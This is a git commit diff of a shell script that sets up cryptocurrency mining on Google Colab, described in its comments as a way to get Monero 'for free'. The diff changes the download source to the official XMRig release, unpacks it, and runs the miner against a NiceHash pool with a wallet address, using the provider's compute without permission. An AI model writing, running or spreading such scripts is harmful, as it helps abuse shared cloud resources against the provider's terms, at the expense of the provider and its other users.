911d90b9fb226dd61e538026f9245cd04747cc5c
MahirAlam <103423298+MahirAlam@users.noreply.github.com>
2022-04-17 17:05:49 +0600

    Update gcolab-sg.sh

--- gcolab-sg.sh
+++ gcolab-sg.sh
@@ -3,11 +3,9 @@
 # Before get xmr coin for free
 # Google Colab
 sudo apt update
-clear
 sudo apt install screen
 screen -R xmr
- 
-wget https://github.com/MahirAlam/rdps/blob/main/xmrig.zip
-unzip xmrig.zip
+wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-bionic-x64.tar.gz
+tar xvzf xmrig-6.16.4-bionic-x64.tar.gz
 cd xmrig-6.16.4
 ./xmrig -o stratum+tcp://randomxmonero.eu-west.nicehash.com:3380 -u 35qheUaRktAzmvTyBdpzih4moF5E3yDb6K -p x -k --nicehash -a rx/0
